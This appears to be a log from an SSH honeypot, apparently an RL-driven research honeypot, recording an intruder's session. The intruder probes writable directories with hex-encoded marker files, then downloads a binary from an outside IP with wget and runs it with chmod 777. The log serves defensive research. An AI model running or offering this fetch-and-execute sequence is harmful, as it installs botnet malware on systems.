+2023-06-29 14:29:18-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: echo -e '\x47\x72\x6f\x70/sys' > /sys/.nippon
+2023-06-29 14:29:18-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] isAllow start
+2023-06-29 14:29:18-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [0.1 0.1 0.1]
+2023-06-29 14:29:18-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start echo
+2023-06-29 14:29:18-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ echo
+2023-06-29 14:29:18-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:29:18-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:29:18-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [0.1 0.1 0.1]
+2023-06-29 14:29:20-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD:    cat /sys/.nippon;   rm -f /sys/.nippon
+2023-06-29 14:29:20-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: cat /sys/.nippon
+2023-06-29 14:29:20-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] isAllow start
+2023-06-29 14:29:20-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [0.1 0.1 0.1]
+2023-06-29 14:29:20-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start cat
+2023-06-29 14:29:20-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ cat
+2023-06-29 14:29:20-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:29:20-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:29:20-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [0.1 0.1 0.1]
+2023-06-29 14:29:20-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] /sys/.nippon resolved into /sys/.nippon
+2023-06-29 14:29:20-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: rm -f /sys/.nippon
+2023-06-29 14:29:20-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] isAllow start
+2023-06-29 14:29:20-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [0.1 0.1 0.1]
+2023-06-29 14:29:20-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start rm
+2023-06-29 14:29:20-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ rm
+2023-06-29 14:29:20-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:29:20-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:29:21-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [0.1 0.1 0.1]
+2023-06-29 14:29:23-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD:   echo -e '\x47\x72\x6f\x70/dev' > /dev/.nippon
+2023-06-29 14:29:23-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: echo -e '\x47\x72\x6f\x70/dev' > /dev/.nippon
+2023-06-29 14:29:23-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] isAllow start
+2023-06-29 14:29:23-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [0.1 0.1 0.1]
+2023-06-29 14:29:23-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start echo
+2023-06-29 14:29:23-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ echo
+2023-06-29 14:29:23-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:29:23-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:29:23-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [0.1 0.1 0.1]
+2023-06-29 14:29:26-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD:    cat /dev/.nippon;   rm -f /dev/.nippon
+2023-06-29 14:29:26-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: cat /dev/.nippon
+2023-06-29 14:29:26-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] isAllow start
+2023-06-29 14:29:26-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [0.1 0.1 0.1]
+2023-06-29 14:29:26-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start cat
+2023-06-29 14:29:26-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ cat
+2023-06-29 14:29:26-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:29:26-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:29:26-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [0.1 0.1 0.1]
+2023-06-29 14:29:26-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] /dev/.nippon resolved into /dev/.nippon
+2023-06-29 14:29:26-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: rm -f /dev/.nippon
+2023-06-29 14:29:26-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] isAllow start
+2023-06-29 14:29:26-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [0.1 0.1 0.1]
+2023-06-29 14:29:26-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start rm
+2023-06-29 14:29:26-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ rm
+2023-06-29 14:29:26-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:29:26-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:29:26-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [0.1 0.1 0.1]
+2023-06-29 14:29:30-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD:   echo -e '\x47\x72\x6f\x70/dev/shm' > /dev/shm/.nippon
+2023-06-29 14:29:30-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: echo -e '\x47\x72\x6f\x70/dev/shm' > /dev/shm/.nippon
+2023-06-29 14:29:30-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] isAllow start
+2023-06-29 14:29:30-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [0.1 0.1 0.1]
+2023-06-29 14:29:30-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start echo
+2023-06-29 14:29:30-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ echo
+2023-06-29 14:29:30-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:29:30-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:29:30-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [0.1 0.1 0.1]
+2023-06-29 14:29:33-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD:    cat /dev/shm/.nippon;   rm -f /dev/shm/.nippon
+2023-06-29 14:29:33-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: cat /dev/shm/.nippon
+2023-06-29 14:29:33-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] isAllow start
+2023-06-29 14:29:33-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [0.1 0.1 0.1]
+2023-06-29 14:29:33-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start cat
+2023-06-29 14:29:33-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ cat
+2023-06-29 14:29:33-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:29:33-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:29:33-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [0.1 0.1 0.1]
+2023-06-29 14:29:33-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] /dev/shm/.nippon resolved into /dev/shm/.nippon
+2023-06-29 14:29:33-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: rm -f /dev/shm/.nippon
+2023-06-29 14:29:33-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] isAllow start
+2023-06-29 14:29:33-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [0.1 0.1 0.1]
+2023-06-29 14:29:33-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start rm
+2023-06-29 14:29:33-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ rm
+2023-06-29 14:29:33-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:29:33-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:29:33-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [0.1 0.1 0.1]
+2023-06-29 14:29:37-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD:   echo -e '\x47\x72\x6f\x70/dev/pts' > /dev/pts/.nippon
+2023-06-29 14:29:37-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: echo -e '\x47\x72\x6f\x70/dev/pts' > /dev/pts/.nippon
+2023-06-29 14:29:37-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] isAllow start
+2023-06-29 14:29:37-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [0.1 0.1 0.1]
+2023-06-29 14:29:37-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start echo
+2023-06-29 14:29:37-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ echo
+2023-06-29 14:29:37-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:29:37-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:29:37-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [0.1 0.1 0.1]
+2023-06-29 14:29:40-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD:    cat /dev/pts/.nippon;   rm -f /dev/pts/.nippon
+2023-06-29 14:29:40-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: cat /dev/pts/.nippon
+2023-06-29 14:29:40-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] isAllow start
+2023-06-29 14:29:40-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [0.1 0.1 0.1]
+2023-06-29 14:29:40-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start cat
+2023-06-29 14:29:40-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ cat
+2023-06-29 14:29:40-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:29:40-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:29:40-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [0.1 0.1 0.1]
+2023-06-29 14:29:40-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] /dev/pts/.nippon resolved into /dev/pts/.nippon
+2023-06-29 14:29:40-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: rm -f /dev/pts/.nippon
+2023-06-29 14:29:40-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] isAllow start
+2023-06-29 14:29:40-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [0.1 0.1 0.1]
+2023-06-29 14:29:40-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start rm
+2023-06-29 14:29:40-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ rm
+2023-06-29 14:29:40-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:29:40-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:29:40-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [0.1 0.1 0.1]
+2023-06-29 14:29:43-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD: /gweerwe323f
+2023-06-29 14:29:43-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command not found: /gweerwe323f
+2023-06-29 14:29:47-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD:  cat /bin/echo 
+2023-06-29 14:29:47-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: cat /bin/echo
+2023-06-29 14:29:47-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] isAllow start
+2023-06-29 14:29:47-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [0.1 0.1 0.1]
+2023-06-29 14:29:47-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start cat
+2023-06-29 14:29:47-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ cat
+2023-06-29 14:29:47-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:29:47-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:29:47-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [0.1 0.1 0.1]
+2023-06-29 14:29:47-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] /bin/echo resolved into /bin/echo
+2023-06-29 14:29:50-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD: /gweerwe323f
+2023-06-29 14:29:50-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command not found: /gweerwe323f
+2023-06-29 14:29:54-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD: cd /
+2023-06-29 14:29:54-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: cd /
+2023-06-29 14:29:54-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] start to get action ..
+2023-06-29 14:29:54-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start cd
+2023-06-29 14:29:54-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ cd
+2023-06-29 14:29:54-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:29:54-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:29:54-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [0.1 0.1 0.1]
+2023-06-29 14:29:54-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] saving the case ...
+2023-06-29 14:29:54-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [0.1 0.1 0.1]
+2023-06-29 14:29:57-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD:    wget http://109.236.86.63/bins/usb_bus.x86 -O - > usb_bus 
+2023-06-29 14:29:57-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: wget http://109.236.86.63/bins/usb_bus.x86 -O - > usb_bus
+2023-06-29 14:29:57-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] isAllow start
+2023-06-29 14:29:57-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [0.1 0.1 0.1]
+2023-06-29 14:29:57-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start wget
+2023-06-29 14:29:57-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ wget
+2023-06-29 14:29:57-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:29:57-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:29:57-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [29.53566101  0.1         0.1       ]
+2023-06-29 14:30:01-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD:    chmod 777 usb_bus ; ./usb_bus 
+2023-06-29 14:30:01-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: chmod 777 usb_bus
+2023-06-29 14:30:01-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] start to get action ..
+2023-06-29 14:30:01-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start chmod
+2023-06-29 14:30:01-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ chmod
+2023-06-29 14:30:01-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:30:01-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:30:01-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [33.56391293  0.1         0.1       ]
+2023-06-29 14:30:01-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] saving the case ...
+2023-06-29 14:30:01-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [33.56391293  0.1         0.1       ]
+2023-06-29 14:30:01-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command not found: ./usb_bus
+2023-06-29 14:30:05-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD: /gweerwe323f
+2023-06-29 14:30:05-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command not found: /gweerwe323f
+2023-06-29 14:30:09-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD: mount
+2023-06-29 14:30:09-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: mount
+2023-06-29 14:30:09-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] start to get action ..
+2023-06-29 14:30:09-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start mount
+2023-06-29 14:30:09-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ mount
+2023-06-29 14:30:09-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:30:09-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:30:09-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [37.82258659  0.1         0.1       ]
+2023-06-29 14:30:09-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] saving the case ...
+2023-06-29 14:30:09-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [37.82258659  0.1         0.1       ]
+2023-06-29 14:30:09-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Reading txtcmd from "/home/anh/Desktop/RLHPot/txtcmds/bin/mount"
+2023-06-29 14:30:14-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD: cat//.nippon
+2023-06-29 14:30:14-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command not found: cat//.nippon
+2023-06-29 14:30:17-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD: cat/bin/echo
+2023-06-29 14:30:17-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command not found: cat/bin/echo
+2023-06-29 14:30:20-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] CMD: exit
+2023-06-29 14:30:20-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Command found: exit
+2023-06-29 14:30:20-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] isAllow start
+2023-06-29 14:30:20-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] case is saving [37.82258659  0.1         0.1       ]
+2023-06-29 14:30:20-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] getAction start exit
+2023-06-29 14:30:20-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] get current command -============================ exit
+2023-06-29 14:30:20-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] do action ===================================
+2023-06-29 14:30:20-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] Action performed:  [0.]
+2023-06-29 14:30:20-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] ******************** [40.66439082  0.1         0.1       ]
+2023-06-29 14:30:20-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] sending close 0
+2023-06-29 14:30:20-0700 [SSHChannel session (0) on SSHService ssh-connection on HoneyPotTransport,0,192.168.139.1] remote close
+2023-06-29 14:30:20-0700 [HoneyPotTransport,0,192.168.139.1] connection lost
